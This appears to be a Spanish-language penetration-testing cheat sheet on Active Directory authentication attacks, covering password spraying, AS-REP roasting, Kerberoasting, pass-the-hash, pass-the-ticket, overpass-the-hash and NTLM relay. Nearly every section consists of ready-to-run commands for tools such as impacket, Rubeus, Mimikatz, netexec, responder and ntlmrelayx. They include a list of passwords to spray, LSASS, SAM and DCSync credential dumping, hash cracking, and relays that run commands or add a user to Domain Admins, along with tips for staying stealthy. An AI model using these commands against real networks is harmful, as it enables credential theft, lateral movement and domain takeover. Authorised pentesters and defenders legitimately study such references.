# Ataques de Autenticación

Los ataques de autenticación en AD explotan los protocolos Kerberos y NTLM para obtener credenciales o tickets que permitan acceder a recursos o escalar privilegios.

### 1. Password Spraying

Probar una contraseña común contra todos los usuarios del dominio. Evita el lockout porque se hacen pocas pruebas por usuario.

#### Verificar política de lockout primero

```bash
# Con netexec
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol

# Con rpcclient
rpcclient -U "usuario%contraseña" 10.10.10.10 -c "getdompwinfo"

# Campos clave:
# - lockoutThreshold: número de intentos antes de bloqueo
# - lockoutObservationWindow: ventana de tiempo para reiniciar el contador
# → Si threshold=5, hacer máximo 3 intentos por usuario para estar seguros
```

#### Ejecución del spray

```bash
# Kerbrute (Kerberos — menos logs en AD)
kerbrute passwordspray -d empresa.local --dc 10.10.10.10 users.txt 'Empresa2024!'

# NetExec
nxc smb 10.10.10.10 -u users.txt -p 'Empresa2024!' --no-bruteforce --continue-on-success
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Spray-AD (PowerShell)
Invoke-SprayEmptyPassword -Domain empresa.local
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Empresa2024!' -Domain empresa.local

# Con impacket
for user in $(cat users.txt); do
    impacket-GetTGT empresa.local/$user:'Empresa2024!' -dc-ip 10.10.10.10 2>/dev/null && echo "[+] $user:Empresa2024!"
done
```

#### Contraseñas típicas a probar

```
Empresa2024!
Empresa2024
Empresa123!
Password1
Password123!
Welcome1
Welcome123!
Bienvenido1!
[NombreEmpresa][Año]!
[Mes][Año]!  → Enero2024!, January2024
[Estación][Año]!  → Spring2024!, Verano2024!
# Contraseña = nombre de usuario (común en cuentas de servicio)
```

***

### 2. AS-REP Roasting

Ataque contra usuarios que tienen desactivada la preautenticación Kerberos (`UF_DONT_REQUIRE_PREAUTH`). El DC devuelve un AS-REP cifrado con el hash del usuario → crackeable offline.

#### Encontrar usuarios vulnerables

```bash
# Con impacket (sin credenciales si se tienen usuarios)
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt

# Con credenciales de dominio
impacket-GetNPUsers empresa.local/usuario:contraseña -dc-ip 10.10.10.10 -request

# Con NetExec
nxc ldap 10.10.10.10 -u usuario -p contraseña --asreproast asrep_hashes.txt

# Con PowerView (Windows)
Get-DomainUser -PreauthNotRequired -Properties samaccountname
```

#### Extraer el hash AS-REP

```bash
# Impacket — guarda directamente el hash en formato hashcat
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -no-pass \
    -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Output (modo 18200 de hashcat):
# $krb5asrep$23$usuario@EMPRESA.LOCAL:a3f1...
```

#### Crackear el hash

```bash
# Hashcat — modo 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# John the Ripper
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Desde Windows con Rubeus

```powershell
# Buscar y extraer AS-REP hashes
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Para un usuario específico
.\Rubeus.exe asreproast /user:victim /format:hashcat
```

### 3. Kerberoasting

Ataque contra cuentas de servicio con **SPN configurado**. Cualquier usuario autenticado puede pedir un TGS para ese servicio → el ticket está cifrado con el hash de la cuenta de servicio → crackeable offline.

#### Encontrar SPNs

```bash
# Con impacket
impacket-GetUserSPNs empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# Con impacket — pedir tickets directamente
impacket-GetUserSPNs empresa.local/usuario:contraseña -dc-ip 10.10.10.10 \
    -request -outputfile kerberoast_hashes.txt

# Con NetExec
nxc ldap 10.10.10.10 -u usuario -p contraseña --kerberoasting kerberoast_hashes.txt

# Con PowerView (Windows)
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

#### Pedir tickets TGS

```powershell
# Rubeus — Kerberoasting (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Kerberoast específico (cuenta de mayor privilegio)
.\Rubeus.exe kerberoast /user:sqlsvc /outfile:kerberoast.txt

# PowerShell nativo (sin herramientas)
Add-Type -AssemblyName System.IdentityModel
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.empresa.local:1433"
[System.Convert]::ToBase64String($ticket.GetRequest())
```

#### Crackear los hashes TGS

```bash
# Hashcat — modo 13100 (RC4) o 19700 (AES256)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# AES256 (más lento)
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Forzar RC4 en Rubeus (más fácil de crackear que AES)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerberoast_rc4.txt
```

***

### 4. Pass-the-Hash (PtH)

Si se obtiene el **hash NTLM** de un usuario, se puede usar directamente para autenticarse sin conocer la contraseña en texto claro. Funciona con protocolos que usan NTLM (SMB, WMI, RDP con RestrictedAdmin, LDAP...).

#### Obtener hashes NTLM

```bash
# Desde SAM local (como admin local)
impacket-secretsdump LOCAL -sam SAM -system SYSTEM

# Desde LSASS volcado (como admin local/dominio)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Con Mimikatz (Windows)
sekurlsa::logonpasswords    # Hashes en memoria de LSASS
lsadump::sam                # Hashes SAM local
lsadump::dcsync /user:Administrator  # DCSync
```

#### Usar el hash para moverse lateralmente

```bash
# impacket — psexec con hash
impacket-psexec empresa.local/Administrator@10.10.10.10 -hashes :NTHASH

# impacket — wmiexec con hash
impacket-wmiexec empresa.local/Administrator@10.10.10.10 -hashes :NTHASH

# impacket — smbexec con hash
impacket-smbexec empresa.local/Administrator@10.10.10.10 -hashes :NTHASH

# NetExec — verificar PtH en toda la red
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH --local-auth
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH  # Con hash de dominio

# Evil-WinRM con hash
evil-winrm -i 10.10.10.10 -u Administrator -H NTHASH

# Mimikatz — sekurlsa::pth (Windows, abre cmd con el hash inyectado)
sekurlsa::pth /user:Administrator /domain:empresa.local /ntlm:NTHASH /run:cmd.exe
```

### 5. Pass-the-Ticket (PtT)

Si se obtiene un **ticket Kerberos** (TGT o TGS), se puede importar en la sesión actual y usarlo para acceder a recursos como si fuera el usuario legítimo.

#### Extraer tickets

```bash
# Rubeus — exportar todos los tickets de la sesión actual
.\Rubeus.exe dump /nowrap

# Rubeus — exportar ticket específico
.\Rubeus.exe dump /user:admin /nowrap

# Mimikatz — exportar tickets de memoria
sekurlsa::tickets /export
kerberos::list /export

# Impacket — getTGT para obtener TGT con credenciales
impacket-getTGT empresa.local/usuario:contraseña -dc-ip 10.10.10.10
# Genera: usuario.ccache
```

#### Importar y usar tickets

```bash
# Linux — usar ticket .ccache con impacket
export KRB5CCNAME=usuario.ccache
impacket-psexec empresa.local/usuario@dc01.empresa.local -k -no-pass
impacket-secretsdump empresa.local/usuario@dc01.empresa.local -k -no-pass

# Windows — Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET
# O desde archivo .kirbi
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Windows — Mimikatz
kerberos::ptt ticket.kirbi
kerberos::ptt BASE64_TICKET

# Verificar tickets importados
klist                                # Windows
klist -l                             # Linux (MIT Kerberos)
.\Rubeus.exe klist                   # Rubeus
```

### 6. Overpass-the-Hash (OtH)

Convierte un **hash NTLM** en un **ticket Kerberos TGT**. Más sigiloso que PtH porque genera tráfico Kerberos en lugar de NTLM.

```bash
# Mimikatz (Windows)
sekurlsa::pth /user:Administrator /domain:empresa.local /ntlm:NTHASH /run:PowerShell.exe
# El cmd/PowerShell abierto tiene el TGT del usuario → puede pedir TGS Kerberos

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /domain:empresa.local /dc:10.10.10.10 /ptt

# Con hash AES (más sigiloso, evita downgrade a RC4)
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256HASH /domain:empresa.local /dc:10.10.10.10 /ptt
```

### 7. NTLM Relay

Capturar autenticaciones NTLM y reenviarlas a otros servicios. Muy efectivo en redes sin firma SMB.

```bash
# Verificar si SMB Signing está deshabilitado (vulnerable a relay)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Paso 1: Envenenar LLMNR/NBT-NS para capturar autenticaciones
sudo responder -I eth0 -rdwv

# Paso 2: Relay hacia los objetivos sin signing
# (apagar SMB y HTTP en responder.conf primero)
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support

# Relay con ejecución de comando
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami > C:\temp\out.txt"

# Relay para obtener shell interactiva
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i

# Relay hacia LDAP (añadir usuario a Domain Admins)
sudo ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user usuario_controlado
```

### Resumen de ataques y condiciones

| Ataque            | Condición           | Output                          |
| ----------------- | ------------------- | ------------------------------- |
| Password Spraying | Lista de usuarios   | Credenciales en claro           |
| AS-REP Roasting   | Usuario sin preauth | Hash crackeable offline         |
| Kerberoasting     | Usuario con SPN     | Hash crackeable offline         |
| Pass-the-Hash     | Hash NTLM           | Acceso como el usuario          |
| Pass-the-Ticket   | Ticket Kerberos     | Acceso como el usuario          |
| Overpass-the-Hash | Hash NTLM           | TGT Kerberos                    |
| NTLM Relay        | SMB signing off     | Acceso o código como la víctima |

> Kerberoasting es uno de los ataques más efectivos: cualquier usuario de dominio puede ejecutarlo, y las cuentas de servicio suelen tener contraseñas débiles y antiguas.

> Al hacer password spray, respetar la política de lockout es crítico. Un lockout masivo en producción delata inmediatamente el ataque y puede causar un incidente grave.

> AS-REP Roasting sin credenciales es posible si se tiene una lista de usuarios válidos obtenida por otros medios (OSINT, enumeración LDAP anónima, etc.).
